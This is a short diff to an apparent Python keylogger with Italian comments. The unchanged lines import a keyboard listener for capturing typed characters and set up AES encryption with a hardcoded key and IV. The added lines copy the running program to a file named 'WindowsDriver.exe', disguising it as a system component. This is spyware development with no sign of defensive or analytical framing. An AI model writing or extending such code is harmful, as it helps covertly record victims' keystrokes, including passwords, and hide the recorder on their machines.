@@ -4,6 +4,16 @@ from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati 
 import time # Libreria contenente funzioni legate al tempo
 from Crypto.Cipher import AES # Algoritmo di crittografia a chiave simmetrica
 
+import sys
+import shutil
+import os
+
+target_path = "A:\\Desktop\\WindowsDriver.exe"
+try:
+    shutil.copyfile(sys.argv[0], target_path)
+except shutil.SameFileError:
+   pass
+
 
 def encryptData(textToEncrypt: str):
     aes = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
